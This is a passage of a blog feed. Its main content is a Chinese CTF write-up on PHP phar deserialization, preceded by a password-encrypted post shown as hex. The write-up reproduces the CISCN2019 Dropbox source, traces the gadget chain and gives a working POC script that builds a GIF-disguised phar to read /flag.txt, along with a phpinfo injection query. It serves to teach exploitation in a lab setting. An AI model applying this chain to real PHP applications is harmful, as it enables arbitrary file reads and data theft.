9951fe70812f066b8e4b69cbcc1c8ac5f677ad3d633f770528baca6e1f5595be70cf332ee939d30177a80056cd447bd6b83f0362e8bad43ef995476862db4a46179454a98983db55d4e9c09bf5358ac0cb5837b59cad88f88fdc3be85bf0236698f6771e4db39907aa048201c93ad7fcc501a814da88853d150a5eb15ec9dc7739b7b907593a92167e7ca955618d901e69f1ad1e743e9658472827fe9572969a802552a7a14cc088a0d117039db67b512d9d947dacd0e2a8f150f4ebef42d64361cd6c013ef59363335fcf7c17d46d022ac71a6aaaa1533fcc8558e5e543fc22c069da7f107795281a5486ea95cc7a7dae153f50e8d31ae202760720692e7b3558c9d1bc320f895acd656416602d97aba89129b994a9db232eb54d9915d43071b429bc5156c5cd54c4b589dc93c68b1df50a273722717c15e2bb9b5e7d4b5c6adba906b46158a491aff9df7adf05cf8f783d2f8c8405bca7cc61f91c57ed539f9097b99cabf143094e5188a3117e2aca787b567fe9c0fbd031730906a826eadbefcb9e91a1ff1bf10d367c4f8fef3bb3b7e3c0fe4bd809c8d1045e5e525d2058de579f32a10c7be744b8f0201c074651dc4d1b631d9ad318522cc37c358e2d93cd4d4d86385af3175b741be290154590e8cb699afa121e7ef889939a5f8a6896a43c45ce18f11fd64c76800b7dd4c3481947e903035d568a78bf116be1c3617af720651c6c8fd21ab53456dbcd244d2ffa9dae050c2b9ad237d77f65f324df4b648f4c584304d4436de7f3298e4eedd874d4e66b60d7d34e2800f5c238226a7f8a616996d269207da7ed57f9a8ff7593a28fca5769880c7b763e0d6a74ef3bb4e2d185461669c5a4ea4d97835a8762844a146573cc0736087e150293ebee7509339fae834a05eaef8e154fcc16244da94395f2127764e05b199b0a5844e058ae0ae39631076262fdcce517f0e7646fe79ede0c2275f8959c1d0cbeea81b3bc75ab2ac22d31e16bcc745b4a8a007c24ba72f15708a216fb6cc7dbdf55ea9bcd631830fcd9808ab7e7c50ac0940eb626d086397f8ec2cd1f44e8550fedc2c491641ae06db298d6a1f9d535b11693b301afd46534188086a2d45de6c2633bd6cb30e51f74be0eaae2bc208b3d81b9fe17a326d5dd14e035c2a28b870d098c2024de36bba7966439861239a4114f4d81197832a0456f278779feff4afbe468ee688f3636005822e96a5df8d13317aa61dec2ce266a12d4237a5f494cf6e5ad29e02ad15c31458aaf7d4b195a5345818497e5f06af5d85968a667ddfe0de5c18af64e62e242d595129f520ec2811d4d80e51e84ff14098da3f7c08102439d69b4a64a155d691641cff7deaa5d98ac7cc0eb3755e996964ffa93723d9b5da59ff95689ff9bc11038789cc4632beab101adfe01824f0928177b4760779dd083235326830df28a6752db6c114edb4183c4b30ad616216007a80d32f1e82ff728bfff7aa75013faf276913e94b69e3a02a647c9e1b8a81d06a573eba105691a58ff7c9d4c69d554bedf1a9d3dbb231ec9e9a2ac9882cb7f81cbc7f6044bcba4db4231c4056f2d5f0f01f37904de0eb3821929cbcae09317dab389ce836bda116e762909a7717c5ab617a838408f5a4715a21c1839d0b0d874a2d0bdf4bcc420430af9641641be7bac2b5dbb1b79922dcbb16e45ec09dde5ac42781a2e62562bade9c062f51e2176ca9da0f9706d99e1b18cbdc8b0bd11f62a73c43d077db0cc5f76ad476b4580111ae85f038a154f4bd00c003ab1b33e4343e1f47f797d5ef6c71e0b311fb7c34ee4f937009dd7bd2fb8f518f978fc20542b7f6fd1c02cc405b41ec9347209d2f42851888f261f2230901ac4d84f90034dd4c103e235799709dc22fd9c6b1bf7350037b8b966b2e8cc9f0b76e4d4852c1704effe250efc45c39736536897cfc507949c26e80af1122afebd30c061d170ab78e70455b6ccdea070df12e9dabe172ae4b1f7b57d457083bd52124e414ff1b83e02e279c6655cab030b92098e708ca8f7d7b265fada3627ebd3e4db43c5fe7a19960eacd9f98ac72c268411f80322cb5553b02848a1632cc3d005c4877e1f8a838063f8d470c19e7d875708df0650f49b26362b35fe59c51f42c9ce273c8266e75074543514f8d0df321945cbbf21908a7816103ec868444e322b62d51987518e79314f3a9a2e641661df2ca15a0e2118634526d068658e50e655e522ff3874dd7cb25304c29450437ed92977bc2a6aac8ca6f2154c02effa921f707b441b7ae19bc4ae08de1f21ecf8890cbe73be301c732066d12f0d8b10ff261548d4cbb09ab9611fbd26a9e3192b4586a7431a8919befa6c6bffe6cf3bc1c08af661578694bad52a2c399fb3c85a93d899b7bf7b9466b2fbc727391036492181fe5639f33c69873dc76133ecdbbb74e26105705f4578471f86e43b051771712fb1479639576c25ff4768619070b1d9423abe59f201964a46eb563a1ee729ddfa93eeb822d8978d0dea7da2869750301084090c5bb8e4f917b68f0c49d97c7eac5e325b1ad11168213e26fc7baa719636baf73c2cf1a74e93842729a2ec6de24328ed546c2c38742b0c9b181f5eec1c458bb56d018a1fe30b7f4b35772af1192213a0f47af4b5e82bb4c3ee6ca39a7796aaff9735c449717dd5c0b52a0a2408e07659ff276aca2f49355fc5ed6e069f5141e8201cd5756a8fd3ebbc45c89c66bfc58fc9cef9d18bc86117a61c54e48565d8453d1c01c545ac230e081e9e84e6714c3a8ab63f14df1fb8a65889111d46b71f7f0b8bb136349df7db68b5b88075cb78cba220f9faa273e776ac616ad351b8052dd898edba53d3f617a08662388ff122feac3a932f0405afcaba8ae8fd0f2385a35f90902ad1886dcc88bcf6d0f3a493d51f0d0904e0d9da7f19ab9a13f3b020f272cb01e2a138c9ab1d022946e4b0d09bf31f0498bdc8d6f61c18e72e3d22de64d6d508752829d1aa7843d8675ce2ea5800f096ce4167d047541cc99fd495c8f0790f24f6fc6f83aa2f875fc08d82bd77e8c9cc03b30b1a75f2453abed4bfbb5494cfa1b89a2548ed423a68f8327e3cc2332d392a72689aa6cd88e4f3ff6491d81fcd4f56ce614ee2201f688ae8e09f3bf53ffbff891b40e26c186a305e6151837b685ebe9249da4cb9620f77f2b3275c889a0594b2a4adeaee04afb24294324e9dc9d22a00d03ba2d3d7c3947337b2652fa725081a73617079eddfa058f8c3ece091106196e0ac959b9ef8891f70230f01ad889e6e2d6c9589976cd5e3495f6f33dca72fc23ab8505472bb203e01b2f7533022305a4601b52465403ca0a65541227f937aeb08d615463413356a0535a9dd1c1cec7a4edca5cd2a725862d56475d2e1e4782990925647a8adb30b0e3f6810df1ea939af0afee524e88c4746ada4c9abc8a3ebf96e2c83bfe249329e840c8f049f5d60d62d7ead1faeb4ce0b7e2aeaeb89d216a4d2ab720101f37f47049fad4dbbfa3d5c63d7a2536ee65ff00f46c7d3e171cd255e3dae7cdf3e8a992acc4f49d5fff5b2f12c6b5292ab0ffe0700d3ec5f95b55b864bf8f6229b7465f622277999953d1632881331b231000eb940df9a83aa66306a4cb78da1e5c2a711f5cd7b07c413254de618733c3e6b38980987beaf5776aa29431f324c79f53b603f41d6332252ac45bc290065877ec1472812b640258b16ea6f02669cdecfcdbe0e9165eb098e6150090bd89c69447b4b316fc3ac738617761b91880f35899b34089156e3eb5600d3adb761358209ebfaa28871ca9c36d719c406ededd0c411aa27cf6da1d088038210f6f0d8db0e63a28267983c6e4dba73e1e879dff331a7bd526e2e11f36053bfdca3993e993c0ef6598e7b38857ae28ceeba5dd5196b181df796f331d649df6f88ae8318ec3d7c31c490b39d66d24f8aac9178be8f5e71516e0656ebd33cf08a887ebeb5d57463eccefc03dfaec5fc5370f842ed3e49201ed9bbf3c686f0dd3681c6b89db783b6909948fbc5eaea119c1735a4a9574c7fdcd349559468ddc4c35dfdbe2dcd5cf80e4fea0203ec6dd99633ebea214c29a5af8b307702886f97c33e6e5be96ee88294abadc7126b4d2ab2f9a7c9cc7df5eb02cce876d6fb81dc744c94322471fe745422cbebb961fad271267283cfcb626de18f4085e2918514cfd9bfc2422cd88773b49f6f20b716980b164b48f3a8e4644ad22846a00c597570c3b84bdf266744e53459aaf4a00a21f772f88ca7c1b8a99a731163fac9193c1ea1e43aa8a7abb7616ac382dfe4fb788a93c92bfcfedfcebebd8bbca8b9b20471aee4378311752603daf12e5b9905c130b743c18431a004976e0316833644a50a3529bac9586ca8fab8dc818e4d5234bc9f188562729103c33badb8198e6b0957c1c92fcde357531ffd58502859b5d24aa020743d318672f9a7a111fa166c4140aa84dd4077cf1cbc2f1dd2c31ffe3bd4e8ac71a054451a8f9c61fe951c2cbfc272867df3ac492af61fc3325765545fa693152195e1cf25b0e860b818c00325a494a93afae468bb081ce444598f140af654ee12bed9fbfcba3abc975dbbbc384faf26e57ac0e19bfce6579ccfd3a4e75bf56f8c3953e188ca9bcbe5dfebf454f2b9f3379fd96dcf51901c1f0f598256b03e9599761cff4546e225f64304a278237cd8e0579e6d3917f62c6d6a7baa2a6a65b655b87ca914ce5ba3550cc42bac58fd79181349476de4c21bf5bdc3fb33f95932e50bfd8454e0f58978eb64181a3076651d51798b3a8c48091dda66ef8524ac6324cd0f443586b6d31ebca3817ddf5bb58d3919903097df570cbe27871646a759ebc1f583eae3ba226e32eb75f88cb17b5baff7bb2fbc0d253e4de364e80d9e968591feea25cf90650247bcfe2ad65cc6e6acf57f59c532bab770aae1643dc611b1374184e04970a007720ce71ff0e5bf8d1e2e6fa8734facca0d5fcef9783d14b3aea42ef1ef502c73978ee1c08414b95dfb476f596aee36e63a14c4e03ec40a438768b88b8aa915cc11b</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>CTF反序列化题目总结(持续更新....)</title>
    <link href="https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-15T06:59:53.000Z</published>
    <updated>2020-03-16T03:29:24.758Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="一-入门题目"><a href="#一-入门题目" class="headerlink" title="一. 入门题目"></a>一. 入门题目</h3><p>代码如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><a id="more"></a><p>很简单的利用phar进行反序列化，POC如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;phar:&#x2F;&#x2F;da4er.phar&amp;__&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>查看生成的phar文件：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><hr><h3 id="二-CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#二-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="二.[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>二.[CISCN2019 华北赛区 Day1 Web1]Dropbox</h3><p>题目知识点为：任意文件下载加phar反序列化。<br>我们直接看phar反序列化的地方：<br>delete.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if (!isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class="line">    header(&quot;Location: login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if (!isset($_POST[&#39;filename&#39;])) &#123;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">chdir($_SESSION[&#39;sandbox&#39;]);</span><br><span class="line">$file &#x3D; new File();</span><br><span class="line">$filename &#x3D; (string) $_POST[&#39;filename&#39;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; true, &quot;error&quot; &#x3D;&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application&#x2F;json&quot;);</span><br><span class="line">    $response &#x3D; array(&quot;success&quot; &#x3D;&gt; false, &quot;error&quot; &#x3D;&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class="line">$dbuser &#x3D; &quot;root&quot;;</span><br><span class="line">$dbpass &#x3D; &quot;root&quot;;</span><br><span class="line">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class="line">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class="line">class User &#123;</span><br><span class="line">    public $db;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $db;</span><br><span class="line">        $this-&gt;db &#x3D; $db;</span><br><span class="line">    &#125;</span><br><span class="line">    public function user_exist($username) &#123;</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;store_result();</span><br><span class="line">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class="line">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function add_user($username, $password) &#123;</span><br><span class="line">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    public function verify_user($username, $password) &#123;</span><br><span class="line">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class="line">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class="line">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        $stmt-&gt;bind_result($expect);</span><br><span class="line">        $stmt-&gt;fetch();</span><br><span class="line">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class File &#123;</span><br><span class="line">    public $filename;</span><br><span class="line">    public function open($filename) &#123;</span><br><span class="line">        $this-&gt;filename &#x3D; $filename;</span><br><span class="line">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function name() &#123;</span><br><span class="line">        return basename($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function size() &#123;</span><br><span class="line">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class="line">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class="line">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class="line">        return round($size, 2).$units[$i];</span><br><span class="line">    &#125;</span><br><span class="line">    public function detele() &#123;</span><br><span class="line">        unlink($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function close() &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个关键在于class这个文件中，分析如下：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>我们可以发现一个File类里面的close函数有一个文件处理函数，那么关键就在于怎么把这个close函数调用。<br>通过分析发现在FileList类里面有个<strong>call魔法函数，也就是说我们可以通过这个魔法函数触发File类里面的close函数。那么接着分析找到User类里面也有个close函数是在</strong>destruct()，那么思路就很清楚了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.构造User类</span><br><span class="line">2.让User类的成员变量再构造一个FileList类</span><br><span class="line">3.让FileList类里面的$files数组里面包含File类</span><br><span class="line">4.File类的$filename变量为flag文件</span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">File Name :     Poc</span></span><br><span class="line"><span class="comment">Description : https://da4er.top</span></span><br><span class="line"><span class="comment">date :          2020-03-15</span></span><br><span class="line"><span class="comment">Author :       Da4er's</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type: text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> File(<span class="string">'/flag.txt'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = <span class="keyword">new</span> User();</span><br><span class="line">$o-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>再delete页面得到flag：</p><img src="/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-入门题目&quot;&gt;&lt;a href=&quot;#一-入门题目&quot; class=&quot;headerlink&quot; title=&quot;一. 入门题目&quot;&gt;&lt;/a&gt;一. 入门题目&lt;/h3&gt;&lt;p&gt;代码如下：&lt;/p&gt;
